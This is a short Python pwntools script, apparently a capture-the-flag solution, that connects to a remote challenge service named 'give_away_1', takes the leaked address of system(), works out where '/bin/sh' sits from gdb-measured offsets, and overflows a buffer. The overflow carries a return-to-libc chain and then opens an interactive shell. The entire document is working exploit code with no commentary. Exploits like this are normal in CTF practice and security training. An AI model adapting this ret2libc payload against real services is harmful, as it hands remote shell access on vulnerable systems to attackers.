from pwn import *
import string
s = string.printable

# p = process('./give_away_1', env={'LD_PRELOAD': 'libc-2.27.so'})
p = remote('sharkyctf.xyz', 20334)

input("attach")

system = p.recv().split()[-1]

gdb_system = 0xf7d0c200
gdb_bin_sh = 0xf7e4d0cf

offset = gdb_bin_sh - gdb_system

bin_sh = offset + int(system,16)

print(hex(bin_sh))
print(system)


payload = b"".join([bytes(i*4,'utf-8') for i in s])

index = payload.index(b"9999")
payload = payload[:index]

payload = payload + p32(int(system,16)) + p32(0x00) + p32(bin_sh)

p.sendline(payload)

p.interactive()
